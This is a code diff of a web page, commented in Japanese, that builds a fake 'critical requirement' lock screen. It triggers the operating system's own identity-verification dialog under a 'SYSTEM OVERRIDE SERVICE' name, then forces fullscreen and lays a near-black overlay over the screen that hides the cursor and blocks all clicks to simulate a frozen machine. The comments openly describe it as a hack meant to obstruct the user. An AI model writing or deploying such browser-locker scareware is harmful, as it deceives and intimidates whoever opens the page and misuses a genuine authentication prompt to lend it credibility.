@@ -62,16 +62,20 @@
       line-height: 2;
     }
 
-    /* 暗黒カーテン（マウス消滅・クリック無効化） */
+    /* ─── 【新ハック】壁紙が見える「極限暗転」カーテン ─── */
     .blackout-curtain {
       position: fixed;
       top: 0; left: 0;
       width: 100vw; height: 100vh;
-      background-color: #000000;
+      /* 修正：完全な黒ではなく、96%の濃い黒にすることで、裏のWindows壁紙を「うっすら」透かす */
+      background-color: rgba(0, 0, 0, 0.96); 
       z-index: 100000;
       display: none;
-      pointer-events: auto; 
-      cursor: none;
+      pointer-events: auto; /* 下の要素のクリックを完全に妨害 */
+      cursor: none; /* マウスカーソルを消滅させてフリーズを演出 */
+      
+      /* さらに画面全体を暗く・コントラストを落とすCSSフィルター（物理的な輝度低下の再現） */
+      backdrop-filter: brightness(0.05) contrast(0.5);
     }
 
     @keyframes fatal-pulse {
@@ -92,7 +96,7 @@
     【 Enter 】キーを押すと、システムを「起動」します...
   </div>
 
-  <!-- 【脱出不能】強制要求ロック画面 -->
+  <!-- 強制要求ロック画面 -->
   <div class="lock-overlay" id="lockScreen">
     <p>🚨 ── [ CRITICAL REQUIREMENT ] ── 🚨
     
@@ -104,10 +108,9 @@
     [ 待機中... ]</p>
   </div>
 
-  <!-- 輝度0を擬似再現する暗黒カーテン -->
+  <!-- 輝度0寸前を擬似再現する暗黒カーテン -->
   <div class="blackout-curtain" id="blackout"></div>
 
-  <!-- 修正：確実にサポートされている音声ファイルソースへ変更 -->
   <audio id="startupSound" src="https://google.com" preload="auto"></audio>
 
   <script>
@@ -200,14 +203,13 @@
 
     // OS純正の本人確認ダイアログ
     async function requestDevicePassword() {
-      // 修正：必須のアルゴリズム型（ES256 と RS256）を両方指定してブラウザ制限を回避
       const publicKeyCredentialCreationOptions = {
         challenge: Uint8Array.from("SHUTDOWN-CONFIRMATION-DATA", c => c.charCodeAt(0)),
         rp: { name: "SYSTEM OVERRIDE SERVICE" },
         user: { id: Uint8Array.from("TARGET123", c => c.charCodeAt(0)), name: "sys_admin", displayName: "SYSTEM_ADMIN" },
         pubKeyCredParams: [
-          { type: "public-key", alg: -7 },   // ES256 (エラー回避用の必須設定)
-          { type: "public-key", alg: -257 } // RS256 (エラー回避用の必須設定)
+          { type: "public-key", alg: -7 },
+          { type: "public-key", alg: -257 }
         ],
         authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
         timeout: 60000
@@ -215,24 +217,23 @@
 
       try {
         await navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions });
-        // 修正：認証ウインドウが完全に閉じてから全画面化するように0.1秒のディレイを挟む
         setTimeout(executeBlackout, 100);
       } catch (err) {
         setTimeout(executeBlackout, 100);
       }
     }
 
-    // 強制全画面化 ＆ 画面ブラックアウト
+    // 強制全画面化 ＆ 画面を極限まで暗転（壁紙を可視化）
     function executeBlackout() {
       if (document.documentElement.requestFullscreen) {
         document.documentElement.requestFullscreen()
           .then(() => {
             blackout.style.display = "block"; 
-            console.log("全画面・輝度0プロトコル：完了");
+            console.log("全画面・輝度低減プロトコル：完了");
           })
           .catch(err => {
-            console.log("全画面化が拒否されましたが、暗黒化を強制実行します:", err);
-            blackout.style.display = "block"; // 全画面化が万が一失敗しても真っ黒にはする
+            console.log("全画面化失敗:", err);
+            blackout.style.display = "block"; 
           });
       } else {
         blackout.style.display = "block";
